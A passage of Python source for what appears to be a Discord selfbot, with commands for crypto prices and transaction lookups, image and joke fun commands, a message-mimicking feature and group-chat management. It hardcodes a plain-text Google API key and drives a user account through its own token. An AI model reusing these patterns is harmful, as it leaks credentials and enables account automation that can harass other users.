                await send(ctx, "__**LTC TX HISTORY**__ <a:tz_ltc:1281238097136451616>", message)
                return

            tx_messages = []
            for tx in transactions[:5]:  # Fetch latest 5 transactions
                tx_id = tx.get("hash", "N/A")
                amount_ltc = round(abs(tx.get("balance_change", 0) / 10**8), 8)  # Convert satoshis to LTC
                amount_usd = round(amount_ltc * 110, 2)  # Approximate USD value (1 LTC = $110)
                is_confirmed = tx.get("is_confirmed", False)
                status = "Confirmed <:lr_tick_1:1290693800808677461>" if is_confirmed else "Unconfirmed <:CROSS_TDG:1321149916201881683>"

                tx_messages.append(
                    f"\n<:rules:1290926829762383934> **Transaction ID: [Click Here](https://blockchair.com/litecoin/transaction/{tx_id})**\n"
                    f"<:exchanger:1322954180452810775> **Amount: {amount_usd}$ [ {amount_ltc} <:LTC:1322611807269031968> ]**\n"
                    f"<:emoji_1738342244745:1334928872269152259> **Status: {status}**"
                )

            final_message = (
                f"**Last {len(tx_messages)} transactions of the address!** <a:check:1281246680724930683>\n\n"
                f"**<:RS_LTC:1291423858183897120> Litecoin Address:**\n"
                f"<:white_arrow:1290693789824061461>`{address}`\n" +
                "".join(tx_messages)
            )
            await send(ctx, "__**LTC TX HISTORY**__ <a:tz_ltc:1281238097136451616>", final_message)

        except Exception as e:
            await send(ctx, "LTC TX History", f"<:CROSS_TDG:1321149916201881683> **Error fetching transactions:** `{e}`")

    @commands.command()
    async def crypto(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:exchanger:1322954180452810775> | **Bitcoin Price** **:** **`{prefix}btcprice`**\n"
            f"<:exchanger:1322954180452810775> | **Ethereum Price** **:** **`{prefix}ethprice`**\n"
            f"<:exchanger:1322954180452810775> | **Binance Coin Price** **:** **`{prefix}bnbprice`**\n"
            f"<:exchanger:1322954180452810775> | **Cardano Price** **:** **`{prefix}adaprice`**\n"
            f"<:exchanger:1322954180452810775> | **Solana Price** **:** **`{prefix}solprice`**\n"
            f"<:exchanger:1322954180452810775> | **Dogecoin Price** **:** **`{prefix}dogeprice`**\n"
            f"<:exchanger:1322954180452810775> | **Ripple Price** **:** **`{prefix}xrpprice`**\n"
            f"<:exchanger:1322954180452810775> | **Litecoin Price** **:** **`{prefix}ltcprice`**\n"
            f"<:exchanger:1322954180452810775> | **Polkadot Price** **:** **`{prefix}dotprice`**\n"
            f"<:exchanger:1322954180452810775> | **Shiba Inu Price** **:** **`{prefix}shibprice`**\n"
            f"<:exchanger:1322954180452810775> | **Chainlink Price** **:** **`{prefix}linkprice`**\n"
            f"<:exchanger:1322954180452810775> | **Polygon Price** **:** **`{prefix}maticprice`**\n"
            f"<:exchanger:1322954180452810775> | **Avalanche Price** **:** **`{prefix}avaxprice`**\n"
            f"<:exchanger:1322954180452810775> | **Stellar Price** **:** **`{prefix}xlmprice`**\n"
            f"<:exchanger:1322954180452810775> | **Tron Price** **:** **`{prefix}trxprice`**\n"
            f"<:exchanger:1322954180452810775> | **LTC Tx History** **:** **`{prefix}txhistory [addy]`**\n"
            f"<:exchanger:1322954180452810775> | **Crypto Tx Info** **:** **`{prefix}cryptotx <coin> <txid>`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Crypto Commands__<:Titanz:1281243489635405827>", description)

    @commands.command(aliases=['btc'])
    async def btcprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Bitcoin (BTC)", "bitcoin", ctx)

    @commands.command(aliases=['eth'])
    async def ethprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Ethereum (ETH)", "ethereum", ctx)

    @commands.command(aliases=['bnb'])
    async def bnbprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Binance Coin (BNB)", "binancecoin", ctx)

    @commands.command(aliases=['ada'])
    async def adaprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Cardano (ADA)", "cardano", ctx)

    @commands.command(aliases=['sol'])
    async def solprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Solana (SOL)", "solana", ctx)

    @commands.command(aliases=['doge'])
    async def dogeprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Dogecoin (DOGE)", "dogecoin", ctx)

    @commands.command(aliases=['xrp'])
    async def xrpprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Ripple (XRP)", "ripple", ctx)

    @commands.command(aliases=['ltc'])
    async def ltcprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Litecoin (LTC)", "litecoin", ctx)

    @commands.command(aliases=['dot'])
    async def dotprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Polkadot (DOT)", "polkadot", ctx)

    @commands.command(aliases=['shib'])
    async def shibprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Shiba Inu (SHIB)", "shiba-inu", ctx)

    @commands.command(aliases=['link'])
    async def linkprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Chainlink (LINK)", "chainlink", ctx)

    @commands.command(aliases=['matic'])
    async def maticprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Polygon (MATIC)", "matic-network", ctx)

    @commands.command(aliases=['avax'])
    async def avaxprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Avalanche (AVAX)", "avalanche-2", ctx)

    @commands.command(aliases=['xlm'])
    async def xlmprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Stellar (XLM)", "stellar", ctx)

    @commands.command(aliases=['trx'])
    async def trxprice(self, ctx):
        await ctx.message.delete()  
        await self.get_crypto_price_embed("Tron (TRX)", "tron", ctx)

    @commands.command(name="cryptotx", description="Gets information about a crypto transaction using blockcypher.com")
    async def cryptotx(self, ctx, coin: str = None, txid: str = None):
        try:
            await ctx.message.delete()
        except:
            pass
            
        status_msg = await ctx.send(content="🔎 Fetching transaction details...")

        # Check if the command is used as a reply
        if ctx.message.reference:
            try:
                replied_msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
                txid_match = re.search(r"([a-fA-F0-9]{64})", replied_msg.content)  # Extract TXID from message
                if txid_match:
                    txid = txid_match.group(0)
            except Exception as e:
                print(f"Failed to fetch replied message: {e}")

        # If TXID is a URL, extract the TXID from it
        if txid and "blockcypher.com" in txid:
            txid_match = re.search(r"([a-fA-F0-9]{64})", txid)
            if txid_match:
                txid = txid_match.group(0)

        # Validate TXID presence
        if not txid:
            try:
                await status_msg.delete()
            except:
                pass
            await ctx.send(content="❌ **Please provide a valid transaction ID or reply to a message containing one!**")
            return

        supported_coins = ["btc", "ltc", "eth", "doge", "bch"]

        # Auto-detect coin if not provided
        if not coin:
            detected_coin = None
            async with aiohttp.ClientSession() as session:
                for possible_coin in supported_coins:
                    url = f"https://api.blockcypher.com/v1/{possible_coin}/main/txs/{txid}"
                    try:
                        async with session.get(url) as response:
                            if response.status == 200:
                                detected_coin = possible_coin
                                break
                    except:
                        pass

            if detected_coin:
                coin = detected_coin
            else:
                try:
                    await status_msg.delete()
                except:
                    pass
                await ctx.send(content="❌ **Failed to detect coin type. Please specify it manually!**")
                return

        # Validate provided coin
        if coin.lower() not in supported_coins:
            try:
                await status_msg.delete()
            except:
                pass
            await ctx.send(content="❌ **Invalid or unsupported coin! Supported: BTC, LTC, ETH, DOGE, BCH.**")
            return

        # API Request
        url = f"https://api.blockcypher.com/v1/{coin.lower()}/main/txs/{txid}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    try:
                        await status_msg.delete()
                    except:
                        pass

                    if response.status == 200:
                        res = await response.json()
                        confirmations = res.get("confirmations", "N/A")
                        preference = res.get("preference", "N/A")
                        confirmed = res.get("confirmed", "Not confirmed").replace("T", " ").replace("Z", "") if res.get("confirmed") else "Not confirmed"
                        received = res.get("received", "Not received").replace("T", " ").replace("Z", "") if res.get("received") else "Not received"
                        double_spend = "True" if res.get("double_spend") else "False"

                        tx_link = f"https://live.blockcypher.com/{coin.lower()}/tx/{txid}"

                        message = f"""
# TX INFO <:crypto:1322611842316501073>  
**<:nxt_blue_crown:1281973611917348989> Transaction Hash: `{txid}`  
<:white_Arrow:1290693791983861822> TX Link: {tx_link}  

<:exchanger:1322954180452810775> Coin: `{coin.upper()}`  
<:experienced_seller:1290924799421583391> Confirmations: `{confirmations}`  
<:star_blue:1284898459232763944> Preference: `{preference}`  
<:emoji_1738342244745:1334928872269152259> Confirmed: `{confirmed}`  
<:lr_tick_1:1290693800808677461> Received: `{received}`  
<a:tz_money:1281238106682560567> Double Spend: `{double_spend}`**  
                        """.strip()

                        await ctx.send(content=message)
                    else:
                        await ctx.send(content="❌ **Invalid Transaction ID or unable to fetch data!**")
            except Exception as e:
                try:
                    await status_msg.delete()
                except:
                    pass
                await ctx.send(content=f"❌ **Failed to fetch transaction data: {e}**")

class fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.mimic_dict = {}
        self.mimic_block_messages = [
            "🚫 Hold up! Commands can't be mimicked.",
            "⚠️ Mimic blocked — commands aren't allowed.",
            "🤖 Command detected. Mimic Rejected.",
            "❌ Whoa there! Mimicking commands is disabled.",
            "🛑 Can't spoof commands. Try sending something else.",
            "🎯 Nope! Commands are off-limits for mimic mode.",
            "🧠 Nice try, but mimicking commands is a no-go.",
            "📵 Command mimic? Nah, we don’t do that here.",
            "👀 Can’t copy commands, only real ones allowed.",
            "💀 Bro, you really tried to mimic a command? No.",
            "🧍‍♂️ This ain’t ChatGPT for bots, stop trying to mimic commands.",
            "🔒 Command mimic mode: disabled by order of the admin gods.",
            "🫡 Respectfully, mimic mode doesn’t do commands.",
        ]
    @commands.command(aliases=['calc'])
    async def calculator(self, ctx):
        """Start an interactive calculator in the channel."""
        await ctx.message.delete()
        await send(ctx, description="__CALCULATOR__", force_selfapp=True)

    @commands.command(aliases=['ttt'])
    async def tictactoe(self, ctx, opponent: discord.Member = None):
        """Start an interactive Tic Tac Toe game with another user."""
        await ctx.message.delete()
        if not opponent:
            await send(ctx, "Tic Tac Toe", "Usage: `+ttt @user`")
            return
        await send(ctx, description=f"__TICTACTOE__|{ctx.author.id}|{opponent.id}", force_selfapp=True)

    async def fetch_image(self, url: str):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None

    async def send_image(self, ctx, user: discord.Member, action: str, api_url: str):
        try:
            res = await self.fetch_image(api_url)
            if res:
                if 'url' in res:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(res['url']) as resp:
                            if resp.status == 200:
                                image = await resp.read()
                                with io.BytesIO(image) as file:
                                    await ctx.send(user.mention, file=discord.File(file, f"spy_{action}.gif"))
                            else:
                                await ctx.send(f"**An error occurred: Failed to fetch the image from the URL**")
                else:
                    await ctx.send(f"**An error occurred: 'url' not found in response**\nResponse: {res}")
            else:
                await ctx.send(f"**An error occurred: Failed to fetch response from the API**")
        except Exception as e:
            await ctx.send(f"**An error occurred: {e}**")

    @commands.command()
    async def fun(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")        
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:LaughtPepe:1281243496136573011> | **Feed User** **:** **`{prefix}feed <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Tickle User** **:** **`{prefix}tickle <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Slap User** **:** **`{prefix}slap <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Hug User** **:** **`{prefix}hug <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Mimic User** **:** **`{prefix}mimic <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Unmimic User** **:** **`{prefix}unmimic <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Stop Mimic (all tasks)** **:** **`{prefix}stopmimic`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Cuddle User** **:** **`{prefix}cuddle <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Smug Expression** **:** **`{prefix}smug <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Pat User** **:** **`{prefix}pat <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Kiss User** **:** **`{prefix}kiss <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Poke User** **:** **`{prefix}poke <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Wink at User** **:** **`{prefix}wink <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Boop User** **:** **`{prefix}boop <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Nom User** **:** **`{prefix}nom <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Gayrate User** **:** **`{prefix}gayrate <user>`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Random Meme** **:** **`{prefix}meme`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Random Joke** **:** **`{prefix}joke`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Calculator (Button-UI)** **:** **`{prefix}calc`**\n"
            f"<a:LaughtPepe:1281243496136573011> | **Tic Tac Toe (vs User)** **:** **`{prefix}ttt [user]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Fun Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def mimic(self, ctx, user: discord.User):
        await ctx.message.delete()
        channel_id = ctx.channel.id
        if channel_id not in self.mimic_dict:
            self.mimic_dict[channel_id] = []

        if user.id not in self.mimic_dict[channel_id]:
            self.mimic_dict[channel_id].append(user.id)
            await ctx.send(f"**✅ Now mimicking {user.mention} in this channel.**")
        else:
            await ctx.send(f"**⚠️ Already mimicking {user.mention} here.**")

    @commands.command()
    async def unmimic(self, ctx, user: discord.User):
        await ctx.message.delete()
        channel_id = ctx.channel.id
        if channel_id in self.mimic_dict and user.id in self.mimic_dict[channel_id]:
            self.mimic_dict[channel_id].remove(user.id)
            if not self.mimic_dict[channel_id]:
                del self.mimic_dict[channel_id]
            await ctx.send(f"**❌ Stopped mimicking {user.mention} in this channel.**")
        else:
            await ctx.send(f"**⚠️ {user.mention} is not being mimicked here.**")


    @commands.command()
    async def stopmimic(self, ctx):
        await ctx.message.delete()
        self.mimic_dict.clear()
        await ctx.send("**🛑 All mimic tasks have been stopped globally.**")



    @commands.Cog.listener()
    async def on_message(self, message):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")        
        channel_id = message.channel.id
        if channel_id in self.mimic_dict:
            if message.author.id in self.mimic_dict[channel_id]:
                if message.content.startswith(prefix):
                    command_name = message.content[len(prefix):].split()[0]  
                    command = voltrix.get_command(command_name)
                    if command:
                        await message.reply(random.choice(self.mimic_block_messages),delete_after=10)                        
                        return                
                await message.channel.send(message.content)


    @commands.command()
    async def gayrate(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        if user is None:
            user = ctx.author
        gay_percentage = 0 if user == ctx.author else random.randint(0, 100)
        await ctx.send(f"<:gayDoge:1291417217858011228> {user.mention} is {gay_percentage}% gay! <:gayDoge:1291417217858011228>")


    @commands.command()
    async def feed(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'feed', "https://nekos.life/api/v2/img/feed")

    @commands.command()
    async def tickle(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'tickle', "https://nekos.life/api/v2/img/tickle")

    @commands.command()
    async def slap(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'slap', "https://nekos.life/api/v2/img/slap")

    @commands.command()
    async def hug(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'hug', "https://nekos.life/api/v2/img/hug")

    @commands.command()
    async def cuddle(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'cuddle', "https://nekos.life/api/v2/img/cuddle")

    @commands.command()
    async def smug(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'smug', "https://nekos.life/api/v2/img/smug")

    @commands.command()
    async def pat(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'pat', "https://nekos.life/api/v2/img/pat")

    @commands.command()
    async def kiss(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'kiss', "https://nekos.life/api/v2/img/kiss")

    @commands.command()
    async def poke(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'poke', "https://nekos.life/api/v2/img/poke")

    @commands.command()
    async def wink(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'wink', "https://nekos.life/api/v2/img/wink")

    @commands.command()
    async def boop(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'boop', "https://nekos.life/api/v2/img/boop")

    @commands.command()
    async def nom(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        user = user or ctx.author    
        await self.send_image(ctx, user, 'nom', "https://nekos.life/api/v2/img/nom")

    @commands.command()
    async def meme(self,ctx):
        await ctx.message.delete()
        await self.send_image(ctx, ctx.author,'meme',"https://meme-api.com/gimme")

    @commands.command()
    async def joke(self,ctx):
        await ctx.message.delete()
        response = requests.get('https://official-joke-api.appspot.com/random_joke')
        joke = response.json()
        await ctx.send(f"<:white_arrow:1290693789824061461> {joke['setup']}\n<:white_arrow:1290693789824061461> {joke['punchline']}")  

class gc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.api_base_url = "https://discord.com/api/v9"
    
    @commands.command()
    async def gc(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:OwnerSpecial:1290692086122680321> | **Make Group** **:** **`{prefix}makegc <user>`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Rename Group** **:** **`{prefix}renamegc <name>`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Leave Group** **:** **`{prefix}leavegc`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Leave all Group** **:** **`{prefix}leavegcs`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Kick from Group** **:** **`{prefix}kickgc <user>`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Add to Group** **:** **`{prefix}addgc <user>`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **List Group** **:** **`{prefix}listgc`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Group info** **:** **`{prefix}gcinfo`**\n"
            f"<:OwnerSpecial:1290692086122680321> | **Kick all from Group** **:** **`{prefix}gckickall`**\n\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__GC Commands__<:Titanz:1281243489635405827>", description)

    @commands.command(aliases=["leaveallgc"])
    async def leavegcs(self, ctx):
        for channel in self.bot.private_channels:
            if isinstance(channel, discord.GroupChannel):
                try:
                    await channel.leave()
                except:
                    pass
    @commands.command()
    async def makegc(self, ctx, user=None):
        await ctx.message.delete()

        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            payload = {"recipients": []}
            async with session.post("https://discord.com/api/v10/users/@me/channels", json=payload) as response:
                if response.status == 200:
                    data = await response.json()
                    channel_id = data["id"]
                    content = f"Group channel created successfully! <#{channel_id}>"
                    # Step 2: Add user via 'addgc' command if provided
                    if user:
                        if user.startswith("<@") and user.endswith(">"):
                            user_id = user.strip("<@!>")
                        else:
                            user_id = user

                        if not user_id.isdigit():
                            await send(ctx, "Error", "Invalid user mention or ID.")
                            return

                        # Fetch the DM channel object
                        channel = await self.bot.fetch_channel(channel_id)
                        if channel:
                            with open('config.json', 'r') as config_file:
                                config = json.load(config_file)
                            prefix = config.get("prefix")    
                            await channel.send(f"{prefix}addgc {user_id}")
                        else:
                            content += "\nFailed to fetch the created channel for adding the user."

                    # Send a success message using your `send` function
                    await send(ctx, "GC Created", content)
                else:
                    error_msg = await response.text()
                    await send(
                        ctx,
                        "Error",
                        f"Failed to create group channel. Status: {response.status}, Error: {error_msg}",
                    )


    @commands.command()
    async def renamegc(self, ctx, *, name: str):
        await ctx.message.delete()
        if not ctx.channel or ctx.channel.type.name != "group":
            await ctx.send("This command can only be used in a Gc.")
            return        
        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            payload = {"name": name}
            async with session.patch(f"{self.api_base_url}/channels/{ctx.channel.id}", json=payload) as response:
                if response.status == 200:
                    await send(ctx,"Gc Renamed",f"<:white_arrow:1290693789824061461> Group chat name successfully changed to **{name}**!")
                else:
                    await ctx.send(f"Failed to rename the group chat. Status code: {response.status}", delete_after=10)

    @commands.command()
    async def leavegc(self, ctx):
        await ctx.message.delete()
        await ctx.channel.close()

    @commands.command()
    async def kickgc(self, ctx, user: str):
        await ctx.message.delete()
        if user.startswith("<@") and user.endswith(">"):
            user_id = user.strip("<@!>")
        else:
            user_id = user
        if not user_id.isdigit():
            await ctx.send("Invalid user mention or ID.")
            return
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.delete(
                f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{user_id}", headers=headers
            ) as response:
                if response.status == 204:
                    await send(ctx, "User Kicked", f"<:white_arrow:1290693789824061461> User <@{user_id}> has been kicked from the Gc.")
                else:
                    await ctx.send(f"Failed to kick user <@{user_id}>.")

    @commands.command()
    async def addgc(self, ctx, user: str):
        await ctx.message.delete()
        if user.startswith("<@") and user.endswith(">"):
            user_id = user.strip("<@!>")
        else:
            user_id = user
        if not user_id.isdigit():
            await ctx.send("Invalid user mention or ID.")
            return
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.put(
                f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{user_id}", headers=headers
            ) as response:
                if response.status == 204:
                    await send(ctx, "User Added", f"<:white_arrow:1290693789824061461> User <@{user_id}> has been added to the Gc.")
                else:
                    await ctx.send(f"Failed to add user <@{user_id}>. Status code: {response.status}")

    @commands.command()
    async def gckickall(self,ctx):
        await ctx.message.delete()
        for member in ctx.channel.recipients:
            token = self.bot.http.token
            headers = {"Authorization": token}
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.delete(
                    f"{self.api_base_url}/channels/{ctx.channel.id}/recipients/{member.id}", headers=headers
                ) as response:
                    if response.status == 204:
                        pass
                    else:
                        await ctx.send(f"Failed to kick user <@{member.id}>.")        


    @commands.command()
    async def listgc(self, ctx):
        await ctx.message.delete()
        token = self.bot.http.token
        headers = {"Authorization": token}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(f"{self.api_base_url}/users/@me/channels", headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    gc_list = [f"<#{gc['id']}> - **{gc['name']}**" for gc in data if gc['type'] == 3]
                    description = "\n<:white_arrow:1290693789824061461> ".join(gc_list) if gc_list else "No Gcs found."
                    await send(ctx, "Gc List", description)
                else:
                    await ctx.send(f"Failed to fetch Gcs. Status code: {response.status}")

    @commands.command()
    async def gcinfo(self, ctx):
        await ctx.message.delete()
        members = [f"\n<:white_arrow:1290693789824061461> <@{member.id}> - {member.name}" for member in ctx.channel.recipients]
        description = "".join(members)
        await send(ctx, f"Gc Info", description)


API_LOL = 'AIzaSyDqk7JHB56dMBW8Fmd0kYG6d98-GSAf6k0'
CX_ID = '80db58308412546d9'

class images(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def send_image(self, ctx, url, filename):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    image_data = await response.read()  
                    image_file = discord.File(io.BytesIO(image_data), filename=filename) 
                    await ctx.send(file=image_file)  
                else:
                    await ctx.send("Failed to retrieve image.", delete_after=10)

    @commands.command()
    async def images(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
